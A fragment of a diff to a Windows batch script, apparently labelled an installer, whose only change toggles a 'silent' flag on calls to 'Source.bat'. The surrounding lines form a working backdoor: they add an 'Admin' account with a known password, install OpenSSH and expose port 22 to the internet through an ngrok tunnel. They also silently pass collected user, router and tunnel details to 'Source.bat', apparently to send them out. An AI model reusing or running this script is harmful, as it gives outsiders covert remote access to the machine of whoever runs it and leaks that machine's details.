@@ -10,15 +10,15 @@ set ""
 
 ::installer.cmd
 ::router>router.txt
-::Source.bat -silent --file %temp%/router.txt
+::Source.bat +silent --file %temp%/router.txt
 
 net user "Admin" "Administrator" /add
 
 whoami>user.txt
-Source.bat -silent --file %temp%/user.txt
+Source.bat +silent --file %temp%/user.txt
 
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-start timeout 5 & Source.bat -silent --file %temp%/ngrok.log
+start timeout 5 & Source.bat +silent --file %temp%/ngrok.log
 ngrok tcp 22 -log=stdout > ngrok.log &
